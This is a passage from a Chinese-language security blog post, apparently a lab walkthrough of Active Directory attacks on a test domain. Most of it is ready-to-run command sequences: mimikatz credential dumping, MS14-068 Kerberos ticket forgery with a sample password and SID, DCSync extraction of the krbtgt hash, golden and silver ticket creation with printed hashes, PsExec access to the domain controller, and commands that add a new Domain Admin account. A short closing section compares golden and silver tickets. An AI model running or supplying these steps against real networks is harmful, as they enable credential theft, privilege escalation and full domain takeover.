<p>​		如果不是只是本地用户可以用mimikatz 抓取本地的域用户密码，记住mimikatz要有管理员权限不然无法抓取内存密码，可以以管理员权限运行。</p>
<p>​		输入<code>privilege::debug </code>权限提升，在输入<code>log </code>会在当前文件夹下生成后面命令执行的结果方便我们查找数据，最后输入<code>sekurlsa::logonPasswords</code> 抓取密码，会在当前目录生成mimikatz 日志文件， 成功获取到明文密码，也获取了域用户sid 和域控主机名</p>
<p>​		利用ms14-068.exe 工具生成伪造的kerberos协议认证证书</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ms-14-068.exe -u  域用户@域控名 -p 域用户密码 -s 域用户sid -d 域ip</span><br></pre></td></tr></tbody></table></figure>

<p>​		 利用mimikatz.exe将证书写入，从而提升为域管理员</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptc 你的证书名字</span><br></pre></td></tr></tbody></table></figure>

<p>​		 写入成功后，使用PsExec.exe以管理员权限运行连接域控</p>
<p>实例：</p>
<p>我们现在以一个本地 administrator 用户登录域内的一个主机中。</p>
<p><img src="https://pic.imgdb.cn/item/6717644cd29ded1a8c256aca.png"></p>
<p>通过命令：<code>net config workstation</code>，可知域名为：moonhack 和其他信息。</p>
<p><img src="https://pic.imgdb.cn/item/67176476d29ded1a8c25cff3.png"></p>
<p>通过命令：<code>nltest /dsgetdc:域名</code>,可知 DC 主机名为：moonhack</p>
<p><img src="https://pic.imgdb.cn/item/67176491d29ded1a8c2615ef.png"></p>
<p>上传 mimikatz，以<strong>管理员权限</strong>运行 CMD,再去执行 mimikatz：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"&gt;log.txt</span><br></pre></td></tr></tbody></table></figure>

<p>这里利用 MS14-068 来提权，先检查下是否有 MS14-068， CVE 编号 CVE-2014-6324,，补丁为 3011780 ： <code>systeminfo |find "3011780"</code>，**<u>如果返回为空就说明没有打补丁</u>**，存在漏洞，需要注意的是域内普通用户提权成功后是有时效性的</p>
<p><img src="https://pic.imgdb.cn/item/671764e2d29ded1a8c26c4e7.png"></p>
<p>访问 08server-ad 失败，提示拒绝访问</p>
<p><img src="https://pic.imgdb.cn/item/671764fad29ded1a8c26f7d6.png"></p>
<p>上传 mimikatz 和 MS14-068 提权工具，whoami /user 或者 whoami/all 查看 test 用户的 suid：</p>
<p><img src="https://pic.imgdb.cn/item/67176512d29ded1a8c272281.png"></p>
<p>使用 MS14-068 伪造票据： </p>
<p>执行命令：<code>ms14-068.exe -u test@moonhack.com -p 123456 -s S-1-5-21-3439616436-2844000184-3841763578-1105 -d 08server-ad.moonhack.com</code>，会在当前目录下生成一个凭证。 </p>
<p>使用方法：  </p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ms14-068.exe -u   域成员名@域名   -p 域成员密码   -s 域成员sid(普通域成员)   -d 域控制器地址 </span><br></pre></td></tr></tbody></table></figure>

<p>使用 mimikatz 清空之前缓存的凭证，导入伪造的凭证，从而提升为域管理员</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # kerberos::purge 		//清空票据</span><br><span class="line">mimikatz # kerberos::ptc 票据文件地址		//票据导入</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://pic.imgdb.cn/item/671767e9d29ded1a8c2d703e.png"></p>
<p>再输入 <code>dir \\08server-ad.moonhack.com\c$</code>，发现访问成功，现在我们有访问域控的权限:</p>
<p><img src="https://pic.imgdb.cn/item/6717680fd29ded1a8c2dc5f6.png"></p>
<p>也可以使用PsExec.exe以管理员权限运行连接域控</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec64.exe \\08server-dc.moonsec.fbi cmd.exe</span><br></pre></td></tr></tbody></table></figure>



<p>添加域管账号密码</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user moonsec123 Qwe123... /add /domain</span><br><span class="line">net group "Domain Admins" moonsec123 /add /domain</span><br></pre></td></tr></tbody></table></figure>



<h6 id="二、伪造金票"><a href="#二、伪造金票" class="headerlink" title="二、伪造金票"></a>二、伪造金票</h6><p><strong>伪造金票的所需条件</strong> </p>
<p>1、域名称 </p>
<p>2、域的 SID 值 </p>
<p>3、域的 KRBTGT 账号的 HASH </p>
<p>4、伪造任意用户名</p>
<p>登录域管用户，执行 <code>whoami</code> 可以看到是 <code>administrator</code> 用户：</p>
<p><img src="https://pic.imgdb.cn/item/6718a718d29ded1a8c9e8f37.png"></p>
<p>使用以下命令导出用户 krbtgt 的 hash：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mimikatz(commandline) # privilege::debug</span><br><span class="line">mimikatz(commandline) # lsadump::dcsync /domain:moonhack.com /all /csv或 lsadump::lsa /inject</span><br><span class="line">mimikatz(commandline) # lsadump::dcsync /domain:moonhack.com /user:krbtgt</span><br><span class="line"></span><br><span class="line">mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:moonsec.fbi /all /csv" "exit"&gt;loghash.txt</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://pic.imgdb.cn/item/6718a758d29ded1a8c9ecf56.png"></p>
<p>利用 mimikatz 生成金票生成.kirbi 文件并保存：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe "kerberos::golden /admin:system /domain:moonhack.com /sid:</span><br><span class="line">S-1-5-21-3439616436-2844000184-3841763578 /krbtgt:4c1d57638dddb470a8588</span><br><span class="line">af80160f5f6 /ticket:ticket.kirbi" exit</span><br></pre></td></tr></tbody></table></figure>

<p>/admin：伪造的用户名 </p>
<p>/domain：域名称 </p>
<p>/sid：SID 值，注意是去掉最后一个-后面的值</p>
<p>/krbtgt：krbtgt 的 HASH 值 </p>
<p>/ticket：生成的票据名称 			//不是写入内存中的命令</p>
<p><img src="https://pic.imgdb.cn/item/6718a7a6d29ded1a8c9f0ec7.png"></p>
<h6 id="三、金票的使用-普通域账户，利用黄金票据，创建域管账户"><a href="#三、金票的使用-普通域账户，利用黄金票据，创建域管账户" class="headerlink" title="三、金票的使用(普通域账户，利用黄金票据，创建域管账户)"></a>三、金票的使用(普通域账户，利用黄金票据，创建域管账户)</h6><p>登录域内普通用户，通过 mimikatz 中的 kerberos::ptt 功能将 ticket.kirbi 导入内存 中。 </p>
<p>导入票据之前访问域控</p>
<p><img src="https://pic.imgdb.cn/item/6718b942d29ded1a8cb1fbc8.png"></p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # kerberos::purge</span><br><span class="line">mimikatz # kerberos::ptt C:\Users\test\ticket.kirbi</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://pic.imgdb.cn/item/6718b966d29ded1a8cb21a2f.png"></p>
<p>注入内存中可以再来访问 dc 可以成功</p>
<p><img src="https://pic.imgdb.cn/item/6718b989d29ded1a8cb23958.png"></p>
<h4 id="白银票据-SILVER-TICKET"><a href="#白银票据-SILVER-TICKET" class="headerlink" title="白银票据 SILVER TICKET"></a>白银票据 SILVER TICKET</h4><h5 id="1-原理-1"><a href="#1-原理-1" class="headerlink" title="1.原理"></a>1.<strong>原理</strong></h5><p>如果说黄金票据是伪造的 TGT,那么白银票据就是伪造的 ST。 在 Kerberos 认证的第三步，Client 带着 ST 和 Authenticator3 向 Server 上的某个服务进行请求，Server 接收到 Client 的请求之后,通过自己的 Master Key 解密 ST, 从而获得 Session Key。通过 Session Key 解密 Authenticator3,进而验证对方的身份,验证成功就让 Client 访问 server 上的指定服务了。 所以我们只需要知道 Server 用户的 Hash 就可以伪造出一个 ST,且不会经过 KDC, 但是伪造的门票只对部分服务起作用。</p>
<h5 id="2-特点-1"><a href="#2-特点-1" class="headerlink" title="2.特点"></a>2.特点</h5><ul>
<li><p>不需要与 KDC 进行交互 </p>
</li>
<li><p>需要 server 的 NTLM hash</p>
</li>
</ul>
<h5 id="3-具体操作介绍-1"><a href="#3-具体操作介绍-1" class="headerlink" title="3.具体操作介绍"></a>3.具体操作介绍</h5><p>登录上面创建的域管用户，用管理员权限打开 CMD，cd 到 mimikatz 存放的目录， 去执行 mimikatz 的命令，得到 SID 和 NTLM，</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"&gt;log.txt</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://pic.imgdb.cn/item/6718c0ced29ded1a8cba1029.png"></p>
<p>先使用 mimikatz 清空票据，再导入伪造的票据,具体伪造票据的命令:</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge</span><br><span class="line">kerberos::golden /domain:moonsec.fbi /sid:S-1-5-21-3068616892-389061042</span><br><span class="line">4-3278931909 /target:12server-dc.moonsec.fbi /service:cifs /rc4:42e2656</span><br><span class="line">ec24331269f82160ff5962387 /user:administrator /ptt</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://pic.imgdb.cn/item/6718c0f3d29ded1a8cba3130.png"></p>
<p>使用方法：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域 SID&gt; /target:&lt;目标服务器主机名&gt; /service:&lt;服务类型&gt; /rc4:&lt;NTLM Hash&gt; /user:&lt;用户名&gt; /ptt</span><br></pre></td></tr></tbody></table></figure>

<p>其中的用户名可以随便写 </p>
<p>服务类型可以从以下内容中来进行选择，因为我们没有 TGT 去不断申请 ticket， 所以只能针对某一些服务来进行伪造</p>
<p><img src="https://pic.imgdb.cn/item/6718c128d29ded1a8cba6094.png"></p>
<p>现在已经有域管的权限了</p>
<p><img src="https://pic.imgdb.cn/item/6718c142d29ded1a8cba7584.png"></p>
<p>kekeo 制作环境银票</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tgt::ask /user:administrator /domain:moonsec.fbi /ntlm:42e2656ec2433126</span><br><span class="line">9f82160ff5962387</span><br><span class="line">// tgt::ask /user:用户名 /domain:域名 /ntlm:NTLM Hash</span><br><span class="line">kerberos::ptt TGT_administrator@MOONSEC.FBI_krbtgt~moonsec.fbi@MOONSEC.FBI.kirbi</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://pic.imgdb.cn/item/6718c18ed29ded1a8cbab53a.png"></p>
<h4 id="金票和银票的区别"><a href="#金票和银票的区别" class="headerlink" title="金票和银票的区别"></a><strong>金票和银票的区别</strong></h4><p><strong>1. 获取的权限不同</strong> </p>
<p>金票：伪造的 TGT，可以获取任意 Kerberos 的访问权限 </p>
<p>银票：伪造的 ST，只能访问指定的服务，如 CIFS </p>
<p><strong>2. 认证流程不同</strong> </p>
<p>金票：同 KDC 交互，但不同 AS 交互 </p>
<p>银票：不同 KDC 交互，直接访问 Server </p>
<p><strong>3. 加密方式不同</strong> </p>
<p>金票：由 krbtgt NTLM Hash 加密 </p>
<p>银票：由服务账号 NTLM Hash 加密</p>

      
    </div>
    <footer class="article-footer">
      
      
      
      
      
      
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li></ul>


    </footer>
  </div>
  
  <nav id="article-nav" data-aos="fade-up">
    
      
      <div class="article-nav-link-wrap article-nav-link-left">
        
          
          
            <img data-src="/covers/2.jpg" data-sizes="auto" alt="深信服安全服务认证工程师学习笔记" class="lazyload">
          
        
        <a href="/2024/09/30/shen-xin-fu-an-quan-fu-wu-ren-zheng-gong-cheng-shi-xue-xi-bi-ji/"></a>
        <div class="article-nav-caption">Prev</div>
        <h3 class="article-nav-title">
          
            深信服安全服务认证工程师学习笔记
          
        </h3>
      </div>
    
    
    
    <div class="article-nav-link-wrap article-nav-link-right">
      
        
        
          <img data-src="/covers/22.jpg" data-sizes="auto" alt="反弹Shell方法" class="lazyload">
        
      
      <a href="/2024/09/19/fan-dan-shell-fang-fa/"></a>
      <div class="article-nav-caption">Next</div>
      <h3 class="article-nav-title">
        
          反弹Shell方法
        
      </h3>
    </div>
    
  </nav>


</article>










</section>
        </div>
        <footer id="footer">
  <div style="width: 100%; overflow: hidden">
    <div class="footer-line"></div>
  </div>
  <div id="footer-info">
    
    <div>
      <span class="icon-copyright"></span>
      
      
      
        2024-2025
      
      <span class="footer-info-sep "></span>
      mX1@0
    </div>
    
      <div>
        Powered by&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
      </div>
    
    
      <div>
        <span class="icon-brush"></span>
        286.1k
        &nbsp;|&nbsp;
        <span class="icon-coffee"></span>
        17:51
      </div>
    
    
    
    
    
      <div>
        <span class="icon-eye"></span>
        <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
        &nbsp;|&nbsp;
        <span class="icon-user"></span>
        <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
      </div>
    
  </div>
</footer>

        
          <div class="sidebar-top">
            <div class="sidebar-top-taichi rotate"></div>
            <div class="arrow-up"></div>
          </div>
        
        <div id="mask" class="hide"></div>
      </div>
      <nav id="mobile-nav">
  <div class="sidebar-wrap">
    
      
        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
  <h3 class="toc-title">Contents</h3>
  <div class="sidebar-toc-wrapper toc-div-class" >
      
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-text">内网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-text">内网基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E4%BD%9C%E7%BB%84"><span class="toc-text">工作组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F"><span class="toc-text">域</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%AF%E5%A2%83"><span class="toc-text">域的几种环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E5%90%8D%E6%9C%8D%E5%8A%A1%E5%99%A8DNS"><span class="toc-text">域名服务器DNS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E6%9C%AF%E8%AF%AD"><span class="toc-text">域术语</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-1"><span class="toc-text">内网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%91%BD%E4%BB%A4"><span class="toc-text">域信息收集命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-text">主机发现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E-MSF-%E7%9A%84%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B"><span class="toc-text">基于 MSF 的内网主机探测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E4%B8%8E%E6%9C%8D%E5%8A%A1"><span class="toc-text">常见端口与服务</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF"><span class="toc-text">域渗透思路</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-Token"><span class="toc-text">内网渗透 Token</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#AccessToken-%E7%9A%84%E7%AA%83%E5%8F%96%E4%B8%8E%E5%88%A9%E7%94%A8"><span class="toc-text">AccessToken 的窃取与利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-incognito"><span class="toc-text">1.incognito</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-MSF-%E4%B8%8B%E7%9A%84-incognito-%E6%A8%A1%E5%9D%97"><span class="toc-text">2.MSF 下的 incognito 模块</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-msf-%E4%BB%A4%E7%89%8C%E5%AE%9E%E6%88%98"><span class="toc-text">3.msf 令牌实战</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F"><span class="toc-text">横向渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PTH-pass-the-hash-HASH-%E4%BC%A0%E9%80%92"><span class="toc-text">PTH(pass-the-hash) HASH 传递</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#mimitkaz-pth"><span class="toc-text">mimitkaz pth</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#psexec"><span class="toc-text">psexec</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-msf-hash-%E6%A8%A1%E5%9D%97"><span class="toc-text">使用 msf hash 模块</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CrackMapExec"><span class="toc-text">CrackMapExec</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WMI"><span class="toc-text">WMI</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#wmic-%E5%91%BD%E4%BB%A4"><span class="toc-text">wmic 命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#wmiexec-py"><span class="toc-text">wmiexec.py</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#wmiexec-vbs"><span class="toc-text">wmiexec.vbs</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Invoke-WmiCommand"><span class="toc-text">Invoke-WmiCommand</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Invoke-WMIMethod"><span class="toc-text">Invoke-WMIMethod</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#wmic-%E7%9A%84%E5%85%B6%E4%BB%96%E5%91%BD%E4%BB%A4"><span class="toc-text">wmic 的其他命令</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PTT-%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB-Pass-the-Ticket"><span class="toc-text">PTT 票据传递攻击(Pass the Ticket)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Kerberos-%E5%8D%8F%E8%AE%AE-Kerberos-%E8%AE%A4%E8%AF%81%E5%8E%9F%E7%90%86"><span class="toc-text">Kerberos 协议&amp; Kerberos 认证原理</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kerberos-%E8%AE%A4%E8%AF%81%E5%8E%9F%E7%90%86"><span class="toc-text">Kerberos 认证原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E5%9B%BE%EF%BC%9A"><span class="toc-text">总图：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AS-REQ-AS-REP"><span class="toc-text">AS_REQ &amp; AS_REP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TGS-REQ-TGS-REP"><span class="toc-text">TGS_REQ &amp; TGS_REP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AP-REQ-AP-REP"><span class="toc-text">AP-REQ &amp; AP-REP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PAC"><span class="toc-text">PAC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kerberos-%E8%AE%A4%E8%AF%81%E4%B8%AD%E7%9A%84%E7%9B%B8%E5%85%B3%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E6%A6%82%E8%BF%B0"><span class="toc-text">Kerberos 认证中的相关安全问题概述</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%EF%BC%88Golden-ticket%EF%BC%89"><span class="toc-text">黄金票据（Golden ticket）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%EF%BC%88Silver-ticket%EF%BC%89"><span class="toc-text">白银票据（Silver ticket）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MS14-068"><span class="toc-text">MS14-068</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92%E6%94%BB%E5%87%BB%EF%BC%88Password-Spraying%EF%BC%89"><span class="toc-text">密码喷洒攻击（Password Spraying）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AS-REP-Roasting"><span class="toc-text">AS-REP Roasting</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB"><span class="toc-text">票据传递攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-Golden-ticket"><span class="toc-text">黄金票据 Golden ticket</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%8E%9F%E7%90%86"><span class="toc-text">1.原理</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E7%89%B9%E7%82%B9"><span class="toc-text">2.特点</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E5%85%B7%E4%BD%93%E6%93%8D%E4%BD%9C%E4%BB%8B%E7%BB%8D"><span class="toc-text">3.具体操作介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E4%BC%AA%E9%80%A0%E5%87%AD%E6%8D%AE%EF%BC%8C%E6%8F%90%E5%8D%87%E5%9F%9F%E5%86%85%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E7%9A%84%E6%9D%83%E9%99%90"><span class="toc-text">一、伪造凭据，提升域内普通用户的权限</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E4%BC%AA%E9%80%A0%E9%87%91%E7%A5%A8"><span class="toc-text">二、伪造金票</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E9%87%91%E7%A5%A8%E7%9A%84%E4%BD%BF%E7%94%A8-%E6%99%AE%E9%80%9A%E5%9F%9F%E8%B4%A6%E6%88%B7%EF%BC%8C%E5%88%A9%E7%94%A8%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%EF%BC%8C%E5%88%9B%E5%BB%BA%E5%9F%9F%E7%AE%A1%E8%B4%A6%E6%88%B7"><span class="toc-text">三、金票的使用(普通域账户，利用黄金票据，创建域管账户)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE-SILVER-TICKET"><span class="toc-text">白银票据 SILVER TICKET</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%8E%9F%E7%90%86-1"><span class="toc-text">1.原理</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E7%89%B9%E7%82%B9-1"><span class="toc-text">2.特点</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E5%85%B7%E4%BD%93%E6%93%8D%E4%BD%9C%E4%BB%8B%E7%BB%8D-1"><span class="toc-text">3.具体操作介绍</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%87%91%E7%A5%A8%E5%92%8C%E9%93%B6%E7%A5%A8%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-text">金票和银票的区别</span></a></li></ol></li></ol></li></ol></li></ol>
      
  </div>
</div>
</div>
        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="mX1@0" class="lazyload">
  <div class="sidebar-author-name">mX1@0</div>
  <div class="sidebar-description"></div>
</div>
<div class="sidebar-state">
  <div class="sidebar-state-article">
    <div>Post</div>
    <div class="sidebar-state-number">54</div>
  </div>
  <div class="sidebar-state-category">
    <div>Category</div>
    <div class="sidebar-state-number">25</div>
  </div>
  <div class="sidebar-state-tag">
    <div>Tag</div>
    <div class="sidebar-state-number">65</div>
  </div>
</div>
<div class="sidebar-social">
  
    <div class="icon-twitter sidebar-social-icon">
      <a href=https://x.com/0xMx1a0 itemprop="url" target="_blank" aria-label="twitter" rel="noopener external nofollow noreferrer"></a>
    </div>
  
</div>
<div class="sidebar-menu">
  
    
      <div class="sidebar-menu-link-wrap">
        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
        <div class="sidebar-menu-icon icon rotate">
          
            &#xe62b;
          
        </div>
        <div class="sidebar-menu-link">首页</div>
      </div>
    
      <div class="sidebar-menu-link-wrap">
        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归类"></a>
        <div class="sidebar-menu-icon icon rotate">
          
            &#xe62b;
          
        </div>
        <div class="sidebar-menu-link">归类</div>
      </div>
    
      <div class="sidebar-menu-link-wrap">
        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
        <div class="sidebar-menu-icon icon rotate">
          
            &#xe62b;
          
        </div>
        <div class="sidebar-menu-link">关于</div>
      </div>
    
      <div class="sidebar-menu-link-wrap">
        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
        <div class="sidebar-menu-icon icon rotate">
          
            &#xe62b;
          
        </div>
        <div class="sidebar-menu-link">友链</div>
      </div>
    
  
</div>
</div>
      
    
  </div>
  
    
      <div class="sidebar-btn-wrapper">
        <div class="sidebar-toc-btn current"></div>
        <div class="sidebar-common-btn"></div>
      </div>
    
  
</nav>

    </div>
    
    
    
    
<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>


<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>





<script src="/js/script.js"></script>



  
<script src="/js/aos.js"></script>

  <script>
    var aosInit = () => {
      AOS.init({
        duration: 1000,
        easing: "ease",
        once: true,
        offset: 50,
      });
    };
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', aosInit);
    } else {
      aosInit();
    }
  </script>



<script src="/js/pjax_script.js" data-pjax></script>







  
<script src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js" integrity="sha384-8LyaidD9GPxQQgLJO&#x2F;WRw&#x2F;O2h3BoNq&#x2F;ApI&#x2F;ecpvM6RsrCz2qP2ppBXUKihP4V&#x2F;2d" crossorigin="anonymous"></script>

  <script>
    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
  </script>










<div id="lazy-script">
  <div>
    
      
      
      <script data-pjax>
        window.REIMU_POST = {
          author: "mX1@0",
          title: "内网渗透",
